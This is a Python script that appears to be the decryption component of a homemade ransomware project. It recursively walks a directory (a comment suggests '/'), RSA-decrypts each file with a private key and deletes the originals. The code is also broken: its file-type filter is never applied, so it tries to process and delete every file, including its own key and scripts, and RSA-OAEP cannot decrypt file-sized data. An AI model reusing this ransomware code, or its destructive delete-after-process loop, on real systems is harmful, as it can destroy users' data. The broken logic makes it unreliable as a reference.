#!/usr/bin/env python3

import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from pathlib import Path
import binascii
 
# Read File Directory
def get_file(currentdir):
    '''
    Scanning Files and Directory
    '''
    for file  in os.scandir(currentdir):
        if os.path.isfile(file):
            yield file
        else:
            yield from get_file(file.path)
# Encrypt Data
def decrypt(filepath,key):

    # Conver Filepath into string
    # Before Sting Filepath:- /home/root1/hnn/ransom.py <class ‘pathlib.PosixPath>
    # print(“Before:- “,filepath, type(filepath))
    
 
    filepath = str(filepath)
   
    # Create New Extension
    new_exe = filepath.split('.hnn')[0]
    #new_exe = filepath.split(‘.’)[0]
    # Read File Data
    with open(filepath,'rb') as f:
        data = f.read()
 
    # Decrypt Data
    decryptor = PKCS1_OAEP.new(key)
    decrypted = decryptor.decrypt(data)
 
    # Save File with New Extenstion
    with open(new_exe,'wb') as f:
        f.write(decrypted)
if __name__ == '__main__':
    with open('private.pem','r') as f:
        key = f.read()
 
    key = RSA.import_key(key)
    #print(“key, type(key)”)
 
    dir = '/home/root1/hnn' # Change this dir or make it root ‘/’
    my_file = ['.hnn','.py','.pem']
    for file in get_file(dir):
        filepath = Path(file)
        fileType = filepath.suffix.lower()
        decrypt(filepath,key)
 
        # Remove Original File
        os.remove(filepath)
